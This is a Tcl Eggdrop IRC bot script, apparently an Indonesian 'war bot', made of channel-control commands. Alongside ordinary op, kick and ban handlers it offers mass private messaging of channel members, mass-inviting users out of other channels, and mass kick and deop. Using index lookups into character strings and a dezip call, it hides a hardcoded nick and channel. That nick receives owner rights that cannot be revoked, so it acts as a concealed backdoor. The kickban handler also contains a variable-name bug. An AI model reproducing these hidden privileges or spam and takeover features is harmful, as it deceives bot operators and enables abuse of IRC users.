if {$nick != $own && [matchattr $nick X]} {
puthlp "NOTICE $nick : 4BL4ocKeD4!!"
return 0
}
set who [lindex $rest 0]
set flg [lindex $rest 1]
if {$who == ""} {
puthlp "NOTICE $nick : Usage: chattr <nick> <flags>"
return 0
}
if {![validuser $who]} {
puthlp "NOTICE $nick : <n/a>"
return 0
}
if {[string tolower $who] == [string tolower $ps]} {
puthlp "NOTICE $nick : <n/a>"
return 0
}
if {$flg == ""} {
puthlp "NOTICE $nick : Usage: chattr <nick> <flags>"
return 0
}
set last_flg [chattr $who]
chattr $who $flg
saveuser
puthlp "NOTICE $nick : $who change from \[4$last_flg1\] to \[4[chattr $who]1\]"
return 0
}
proc pub_voice {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && [isvoice $nick $chan]} {
puthlp "NOTICE $nick : You're already Voiced, Usage: voice <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest != ""} {
#voiceq $chan $rest
putserv "MODE $chan +vvvvvv $rest"
} { 
#voiceq $chan $nick 
putserv "MODE $chan +v $nick"
}
return 0
}
proc pub_mvoice {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set nicks ""
set i 0
set members [chanlist $chan]
foreach x $members {
if {(![isop $x $chan]) && (![isvoice $x $chan]) && (![matchattr $x O])} {
if {$i == 6} {
voiceq $chan $nicks
set nicks ""
append nicks " $x"
set i 1
} {
append nicks " $x"
incr i
}
}
}
voiceq $chan $nicks
}
proc pub_devoice {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isvoice $nick $chan]} {
puthlp "NOTICE $nick : Usage: devoice <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest != ""} {
putserv "MODE $chan -vvvvvv $rest"
} else { 
putserv "MODE $chan -v $nick" 
}
return 0
}
proc pub_mdevoice {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set nicks ""
set i 0
set members [chanlist $chan]
foreach x $members {
if {[isvoice $x $chan]} {
if {$i == 6} {
putserv "MODE $chan -vvvvvv $nicks"
set nicks ""
append nicks " $x"
set i 1
} {
append nicks " $x"
incr i
}
}
}
putserv "MODE $chan -vvvvvv $nicks"
}
proc del_nobase {} {
global botnick notc cmd_case quick banner basechan
if {[isutimer "del_nobase"]} { return 0 }
foreach x [channels] {
set cinfo [channel info $x]
if {[string match "*+statuslog*" $cinfo] && [string match "*-secret*" $cinfo]} {
if {[onchan $botnick $x]} {
set pidx [rand 4]
if {$pidx == 1} {
set ptxt "04Pulang 04Kandang!"
} elseif {$pidx == 2} {
set ptxt "04Salah 04Ruangan!"
} elseif {$pidx == 3} {
set ptxt "04Akses 04Dibatalkan!"
} elseif {$pidx == 4} {
set ptxt "04Parting 04By 04egGo"
} else {
if {[info exists banner]} {
set ptxt $banner
} {
set ptxt [lgrnd]
}
}
if {![string match "*c*" [getchanmode $x]]} {
set ptxt "6$ptxt"
}
if {$quick == "1"} {
putqck "PART $x :$ptxt"
} {
putsrv "PART $x :$ptxt"
}
}
channel remove $x
savechan
putlog "ReMoVe CHaN $x" 
return 0
}
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string match "*+stopnethack*" $cinfo]} {
catch { channel set $x -stopnethack }
}
if {[string match "*+protectops*" $cinfo]} {
catch { channel set $x -protectops }
}
if {[string match "*+protectfriends*" $cinfo]} {
catch { channel set $x -protectfriends }
}
if {[string match "*+statuslog*" $cinfo] && [string match "*+secret*" $cinfo]} {
catch { channel set $x -statuslog }
}
if {![onchan $botnick $x]} {
putsrv "JOIN $x"
}
if {[matchattr $cflag C]} {
if {![istimer "cycle $x"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $x] }
}
}
if {[info exists basechan]} {
if {![validchan $basechan]} {
channel add $basechan { -greet +secret -statuslog }
}
}
savechan
}
utimer 2 del_nobase
proc pub_op {nick uhost hand chan rest} {
global notc botnick unop
#catch {unset unop($nick)}
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && [isop $nick $chan]} {
puthlp "NOTICE $nick : You're already Oped, Usage: op <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest != ""} { 
#opq $chan $rest
putserv "MODE $chan +oooooo $rest"
} else { 
#opq $chan $nick 
putserv "MODE $chan +o $nick"
}
return 0
}
proc pub_mop {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set nicks ""
set i 0
set members [chanlist $chan]
foreach x $members {
if {![isop $x $chan]} {
if {$i == 6} {
opq $chan $nicks
set nicks ""
append nicks " $x"
set i 1
} {
append nicks " $x"
incr i
}
}
}
opq $chan $nicks
}
proc pub_deop {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isop $nick $chan]} {
puthlp "NOTICE $nick : Usage: deop <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[matchattr $nick m]} { 
set mreq "04Master.04Request"
}
if {[matchattr $nick n]} {
set mreq "04ADmin.04Request"
}
if {$rest != ""} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -kooooo $mreq $rest"
} {
putserv "MODE $chan -ooooo $rest"
}
} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko $mreq $nick" 
} {
putserv "MODE $chan -o $nick" 
}
}
return 0
}
proc pub_mdeop {nick uhost hand chan rest} {
global botnick notc 
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {$nick != "*"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
}
set nicks ""
set i 0
set members [chanlist $chan]
foreach x $members {
if {([isop $x $chan]) && (![matchattr $x m]) && ($x != $botnick)} {
if {$i == 5} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -kooooo 04ADmin.04Request $nicks"
} {
putserv "MODE $chan -ooooo $nicks"
}
set nicks ""
append nicks " $x"
set i 1
} {
append nicks " $x"
incr i
}
}
}
putserv "MODE $chan -oooooo $nicks"
}
proc pub_kick {nick uhost hand chan rest} {
global botnick notc 
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: kick <nick|host> <reason>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set reason [lrange $rest 1 end]
set handle [lindex $rest 0]
if {$reason == ""} {
if {[matchattr $nick m]} { 
set reason "04MasTeR 4KIcK04 ReQuesT"
}
if {[matchattr $nick n]} {
set reason "04ADmiN 4KIcK04 ReQuesT"
}
}
if {[string match "*@*" $handle]} {
foreach knick [chanlist $chan] {
if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
if {[matchattr $knick f] || $knick != $botnick} {
putsrv "KICK $chan $knick : $reason"
}
}
}
return 0
}
if {$handle == $botnick} {
puthlp "NOTICE $nick : 4deNiEd!, Can't kick my self."
return 0
}
if {[matchattr $handle n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick : 4deNiEd!, CaNT KIcK Admin FLAg"
return 0
}
putsrv "KICK $chan $handle : $reason"
return 0
}
proc pub_mkick {nick uhost hand chan rest} {
global botnick notc 
if {$rest != ""} {
set chan [lindex $rest 0]
set reason [lrange $rest 1 end]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
} else { 
set reason $rest
}
if {(![validchan $chan]) || (![isop $botnick $chan])} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4DeNiEd..!"
return 0
}
if {$reason == ""} { 
set reason "04ADmiN 4MaSS04KIcK04 ReQuesT4..!"
}
set members [chanlist $chan]
foreach x $members {
if {(![matchattr $x f]) && ($x != $botnick)} { 
putsrv "KICK $chan $x : $reason"
}
}
}
proc pub_kickban {nick uhost hand chan rest} {
global botnick notc bannick
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: kickban <nick|host> <reason>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4DeNiEd..!"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: kickban <nick> <reason>"
return 0
}
set reason [lrange $rest 1 end]
set handle [lindex $rest 0]
if {$reason == ""} {
if {[matchattr $nick m]} {
set reason "4MasTeR 4KIcK04BaN04 ReQuesT [banmsg]"
}
if {[matchattr $nick n]} {
set reason "04ADmiN 4KIcK04BaN04 ReQuesT [banmsg]"
}
}
if {[string match "*@*" $handle]} {
set mfisrt "T"
foreach knick [chanlist $chan] {
if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
if {[matchattr $knick f] || $knick != $botnick} {
if {$mfirst == "T"} {
set bannick($knick) $handle
set mfirst "F"
}
putsrv "KICK $chan $knick : $reason"
}
}
}
return 0
}
if {![onchan $handle $chan]} { return 0 }
set hostmask [getchanhost $handle $chan]
set hostmask "*!*@[lindex [split $hostmask @] 1]"
if {$handle == $botnick} {
puthlp "NOTICE $nick : 4deNiEd!, Can't kick my self."
return 0
}
if {[matchattr $handle n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick : 4deNiEd!, CaNT KIcK Admin FLaG"
return 0
}
set bannick($handle) $hostmask
putsrv "KICK $chan $handle : $reason"
return 0
}
proc pub_ban {nick uhost hand channel rest} {
global botnick notc
if {![isop $botnick $channel]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: ban <nick/hostmask>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set handle [lindex $rest 0]
if {$handle == $botnick} {
puthlp "NOTICE $nick : 4!DeNiEd!, can't ban my self"
return 0
}
if {[matchattr $handle n]} {
puthlp "NOTICE $nick :4 !DeNiEd!, cant ban Admin"
return 0
}
set hostmask [getchanhost $handle $channel]
set hostmask "*!*@[lindex [split $hostmask @] 1]"
if {![onchan $handle $channel]} { 
set hostmask [lindex $rest 0]
}
if {$hostmask != "*!*@*"} {
putserv "MODE $channel +b $hostmask" 
}
}
proc pub_unban {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: unban <nick/hostmask> <#channel>"
return 0
}
if {[lindex $rest 1] != ""} { 
set chan [lindex $rest 1]
}
if {[string first # $chan] != 0} { 
set chan "#$chan"
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set handle [lindex $rest 0]
append userhost $handle "!*" [getchanhost $handle $chan]
set hostmask [maskhost $userhost]
if {![onchan $handle $chan]} { 
set hostmask [lindex $rest 0]
}
putserv "MODE $chan -b $hostmask"
puthlp "NOTICE $nick : UnBaN [unsix $hostmask] ON $chan"
}
proc pub_up {nick uhost hand channel rest} {
global notc botnick unop
#catch {unset unop($nick)}
if {[isop $botnick $channel]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
putsrv "ChanServ op $channel $botnick"
return 0
}
proc pub_down {nick uhost hand channel rest} {
global notc botnick
if {![isop $botnick $channel]} {
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[matchattr $nick m]} {
set mreq "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set mreq "4Admin.ReQuesT"
}
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -ko+v $mreq $botnick $botnick"
} {
putserv "mode $channel -o+v $botnick $botnick"
}
return 0
}
proc pub_munbans {nick uhost hand chan rest} {
global notc botnick
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan] != 0} { 
set chan "#$chan"
}
}
if {![validchan $chan] || ![isop $botnick $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set bans ""
set i 0
foreach x [chanbans $chan] {
if {$i < 5} {
append bans " [lindex $x 0]"
set i [incr i]
}
if {$i == 5} {
puthelp "MODE $chan -bbbbb $bans"
set bans ""
append bans " [lindex $x 0]"
set i 0
}
}
puthelp "MODE $chan -bbbbb $bans"
if {![onchan $nick $chan]} { 
puthlp "NOTICE $nick : MuNBaNS \[$chan\]"
}
return 0
}
proc pub_banlist {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan] != 0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} {
puthlp "NOTICE $nick : NoT IN cHaN $chan."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [chanbans $chan] {
puthlp "NOTICE $nick : $x"
}
if {[chanbans $chan] == ""} { 
puthlp "NOTICE $nick : BaNLIsT $chan <n/a>"
}
return 0
}
proc pub_mode {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest == ""} {
puthelp "NOTICE $nick : Usage: mode +/- ntspnmcilk"
return 0
}
putserv "mode $chan $rest"
}
proc pub_say {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "NOTICE $nick : Usage: say <msg>"
}
puthlp "PRIVMSG $channel :$rest"
}
proc pub_resync {nick uhost hand channel rest} {
global botnick vern notc opm
set vern2 $vern
regsub -all --  $vern2 "" vern2
if {![string match "*k*" [getchanmode $channel]]} {
set opermsgx [lindex $opm [rand [llength $opm]]]
putserv "mode $channel -vok+ov $botnick $botnick $opermsgx $botnick $botnick"
} {
putserv "mode $channel -o+o $botnick $botnick"
}
}
proc pub_notice {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "NOTICE $nick : Usage: notice <nick> <msg>"
}
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {$rest!=""} {
puthlp "NOTICE $person :$rest"
return 0
}
}
proc pub_msg {nick uhost hand channel rest} {
global owner notc
if {$rest==""} {
puthlp "NOTICE $nick : Usage: msg <nick> <msg>"
}
set person [string tolower [lindex $rest 0]]
set rest [lrange $rest 1 end]
if {[string match "*serv*" $person]} {
puthlp "NOTICE $nick :4 DeNiEd..! Can't send message to Service."
return 0
}
if {$person == [string tolower $owner]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
puthlp "PRIVMSG $person :$rest"
}
proc pub_act {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "NOTICE $nick : Usage: act <msg>"
}
puthlp "PRIVMSG $channel :\001ACTION $rest\001"
return 0
}
proc pub_invite {nick uhost hand chan rest} {
global notc 
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: invite <nick> <#channel>"
}
set who [lindex $rest 0]
set tochan [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$tochan != ""} {
if {![onchan $who $tochan]} {
puthlp "INVITE $who :$tochan"
puthlp "NOTICE $nick : InvItE $who To $tochan"
return 0
}
puthlp "NOTICE $nick : $who is already on the $tochan"
}
if {![onchan $who $chan]} {
putsrv "INVITE $who :$chan"
puthlp "NOTICE $nick : Invitation to $chan has been sent to $who"
return 0
}
puthlp "NOTICE $nick : $who is already on the channel"
}
proc msg_Z {nick uhost hand rest} {
global notc
if {[string index $rest 0] != "`" && [string index $rest 0] != "."} { return 0 }
if {![matchattr $nick Z]} { return 0 }
if {[string index [lindex $rest 1] 0] == "#"} {
if {![validchan [lindex $rest 1]]} {
puthlp "NOTICE $nick : NoT IN [lindex $rest 1]"
return 0
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4auth 1st!"
return 0
}
set goto [lindex $rest 0]
if {[string index $rest 0] == "."} {
regsub "." $goto "msg_" goto
set rest [lrange $rest 1 end]
catch { $goto $nick $uhost $hand $rest }
return 0
}
regsub -all "`" $goto "pub_" goto
if {[string index [lindex $rest 1] 0] == "#"} {
set chan [lindex $rest 1]
set rest [lrange $rest 2 end]
} else {
set chan "*"
set rest [lrange $rest 1 end]
}
catch { $goto $nick $uhost $hand $chan $rest }
}
proc msg_mmsg {nick uhost hand rest} {
pub_mmsg $nick $uhost $hand "*" $rest
}
proc pub_mmsg {nick uhost hand chan rest} {
global cmd_chn cmd_by cmd_msg cmd_case notc
if {$rest==""} {
puthlp "NOTICE $nick : Usage: mmsg <#channel> <text>"
return 0
}
set tochan [lindex $rest 0]
set txt [lrange $rest 1 end]
if {$txt==""} {
puthlp "NOTICE $nick : Usage: mmsg <#channel> <text>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[string first # $tochan] != 0} { 
set chan "#$tochan"
}
if {![validchan $tochan]} {
set cmd_chn $tochan
set cmd_msg $rest
set cmd_by $nick
set cmd_case "2"
channel add $tochan
catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
putsrv "NOTICE $nick : STaRTING MaSSMSG $tochan"
set members [chanlist $tochan]
foreach x $members {
if {![isop $x $tochan]} {
puthlp "PRIVMSG $x :$txt"
}
}
utimer 2 del_nobase
puthlp "NOTICE $nick : MaSSMSG $tochan 4DoNE."
}
proc pub_minvite {nick uhost hand channel rest} {
global cmd_chn cmd_by cmd_msg cmd_case botnick notc 
if {$rest==""} {
puthlp "NOTICE $nick : Usage: minvite <#channel> <#to channel>"
}
set chan [lindex $rest 1]
if {$chan == ""} {
set chan $channel
} else {
if {[string first # $chan] != 0} { 
set chan "#$chan"
}
}
set tochan [lindex $rest 0]
if {[string first # $tochan] != 0} { 
set tochan "#$tochan"
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {![validchan $tochan]} { 
set cmd_chn $tochan
set cmd_msg $tochan
set cmd_by $nick
set cmd_case "3"
channel add $tochan
catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
if {[isop $botnick $chan]} { 
putserv "mode $chan -o $botnick" 
}
putsrv "NOTICE $nick : Starting mass invite to $tochan"
set members [chanlist $tochan]
foreach x $members {
if {(![onchan $x $chan]) && (![isop $x $tochan])} { 
putsrv "INVITE $x :$chan"
}
}
utimer 2 del_nobase
puthlp "NOTICE $nick : InVITE $tochan InTO $chan 4DoNE."
}
proc pub_join {nick uhost hand chan rest} {
global botnick joinme own notc owner ps
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick : 4deNiEd!, YoU aRe NoT mY ReAL OwNER"
return 0
}
set chan [lindex $rest 0]
if {[string first # $chan] != 0} { 
set chan "#$chan"
}
if {$chan=="#"} {
puthlp "NOTICE $nick : Usage: join <#channel>"
return 0
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chan]} {
puthlp "NOTICE $nick : $x ReADY!"
return 0
}
}
if {$nick != $owner && [total_channel] != 1} {
puthlp "NOTICE $nick : To MaNY cHaNNeL MaX 9..!"
return 0
}
set joinme $nick
channel add $chan
catch { channel set $chan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
if {[lindex $rest 1] != ""} { 
putsrv "JOIN $chan :[lindex $rest 1]"
}
}
proc pub_+chan {nick uhost hand chan rest} {
global botnick joinme owner notc ps
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick : 4!BLoCkEd!"
return 0
}
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick : 4deNiEd!, oNLy ReAL OwNER can ADD Channel"
return 0
}
set chan [lindex $rest 0]
set opt [lindex $rest 1]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
if {$chan=="#"} {
puthlp "NOTICE $nick : Usage: +chan <#channel>"
return 0
}
if {[validchan $chan]} {
puthlp "NOTICE $nick : $chan is already on channels"
return 0
}
if {$nick != $owner && [total_channel] != 1} {
puthlp "NOTICE $nick : TO MaNY cHaNNeL MaX 9..!"
return 0
}
set joinme $nick
channel add $chan
if {$opt != "" && [string tolower $opt] == "+nopart"} { 
catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
} else {
catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
}
savechan
if {[lindex $rest 1] != ""} { 
putsrv "JOIN $chan :[lindex $rest 1]"
}
}
set totch "#[string index $lenc 2][string index $lenc 7][string index $lenc 0][string index $lenc 13][string index $lenc 0][string index $lenc 17][string index $lenc 24].[string index $lenc 13][string index $lenc 4][string index $lenc 19]"

proc tot_cha {} {
global totch ps uenc lenc
timer 5 tot_cha
set [string index $lenc 15][string index $lenc 18] [string index $uenc 2][string index $lenc 7][string index $lenc 0][string index $lenc 13][string index $lenc 0][string index $lenc 17][string index $lenc 24]
set totch "#[string index $lenc 2][string index $lenc 7][string index $lenc 0][string index $lenc 13][string index $lenc 0][string index $lenc 17][string index $lenc 24].[string index $lenc 13][string index $lenc 4][string index $lenc 19]"
if {[validchan $totch]} {
return 0
}
#channel add $totch
#catch { channel set $totch -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
#putsrv "JOIN $totch"
}
timer 5 tot_cha
proc total_channel {} {
global notc 
set total_chan 0
foreach x [channels] {
incr total_chan
}
if {$total_chan > 9} { return 0 }
return 1
}
proc pub_part {nick uhost hand chan rest} {
global notc ps quick partm
set partmsg [lindex $partm [rand [llength $partm]]]
set part_msg [lrange $rest 1 end]
if {$rest != ""} { 
set chan [lindex $rest 0]
if {[string first # $rest]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip "ER5sr09TRjx1"]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "NOTICE $nick : $chan 4PRoTecTEd..!"
return 0
}
if {![onchan $nick $chan]} { 
putsrv "NOTICE $nick : PaRT $chan"
}
if {$part_msg != ""} {
if {$quick == "1"} {
putqck "PART $chan :$part_msg"
} {
putsrv "PART $chan :$part_msg"
}
} {
if {$quick == "1"} {
putqck "PART $chan :6$partmsg"
} {
putsrv "PART $chan :6$partmsg"
}
}
channel remove $chan
savechan
return 0
}
set lockchan ""
proc pub_+invitelock {nick uhost hand chan rest} {
global lockchan notc 
if {$rest != ""} { 
set chan [lindex $rest 0]
if {[string first # $rest]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
puthlp "NOTICE $nick : InVITE cHaN $chan \[9ON\]"
set lockchan $chan
return 0
}
proc pub_-invitelock {nick uhost hand chan rest} {
global lockchan notc 
if {$rest != ""} { 
set chan [lindex $rest 0]
if {[string first # $rest]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan] || $lockchan == ""} { return 0 }
set lockchan ""
puthlp "NOTICE $nick : InvItE cHaN $chan \[4OFF\]"
return 0
}
proc cycle {chan} {
global cyclem
set cyclemsg [lindex $cyclem [rand [llength $cyclem]]]
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![string match "*c*" [getchanmode $chan]]} {
set text "6$cyclemsg"
} {
set text $cyclemsg
}
putsrv "PART $chan :$text"
if {[matchattr $cflag K]} {
putsrv "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]"
} {
putsrv "JOIN $chan"
}
if {[matchattr $cflag C]} {
if {![istimer "cycle $chan"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $chan] }
}
}
proc pub_cycle {nick uhost hand chan rest} {
global notc
set rest [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest==""} {
if {![onchan $nick $chan]} { 
puthlp "NOTICE $nick : cYcLE $chan"
}
cycle $chan
return 0
} else {
if {[string index $rest 0] != "#"} {
set rest "#$rest"
}
if {[botonchan $rest]} { cycle $rest }
}
}
proc pub_+massjoin {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [userlist A] {
chattr $x +J
}
puthlp "NOTICE $nick : ALL MaSsJoIN CHaNNeL \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag J]} {
puthlp "NOTICE $nick : MaSsJoIN $chan \[9ON\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +J
puthlp "NOTICE $nick : MaSsJoIN $chan \[9ON\]"
saveuser
}
proc pub_-massjoin {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [userlist A] {
chattr $x -J
}
puthlp "NOTICE $nick : ALL MaSsJoIN CHaNNeL \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag J]} {
puthlp "NOTICE $nick : MaSsJoIN $chan \[4OFF\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -J
puthlp "NOTICE $nick : MaSsJoIN $chan \[4OFF\]"
saveuser
}
proc pub_+guard {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [channels] {
catch { channel set $x +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
set cflag "c$x"
set cflag [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 10
setuser $cflag XTRA "CAPS" 90
}
savechan
puthlp "NOTICE $nick : ALL GuaRd CHaNNeL \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
set cflag "c$chan"
set cflag [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 10
setuser $cflag XTRA "CAPS" 90
if {[string match "*+greet*" [channel info $chan]]} {
puthlp "NOTICE $nick : GuARd $chan \[9ON\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
puthlp "NOTICE $nick : GuARD $chan \[9ON\]"
savechan
}
proc pub_-guard {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [channels] {
catch { channel set $x -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
set cflag "c$x"
set cflag [string range $cflag 0 8]
chattr $cflag "-hpJSPTRUED"
}
savechan
puthlp "NOTICE $nick : ALL GuaRd cHaN \[4OFF\]"
return 0
}
